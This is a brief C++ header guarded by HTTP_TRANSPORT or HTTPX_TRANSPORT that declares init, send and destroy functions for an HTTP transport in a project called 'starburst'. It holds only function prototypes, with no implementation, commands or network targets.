#ifndef STARBURST_TRANSPORT_HTTP_H
#define STARBURST_TRANSPORT_HTTP_H

#include <common.h>

#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )

namespace starburst {

    auto declfn http_init( instance& inst ) -> bool;
    auto declfn http_send( instance& inst, uint8_t* data, uint32_t len, uint8_t** response, uint32_t* resp_len ) -> bool;
    auto declfn http_destroy( instance& inst ) -> void;

}

#endif
#endif
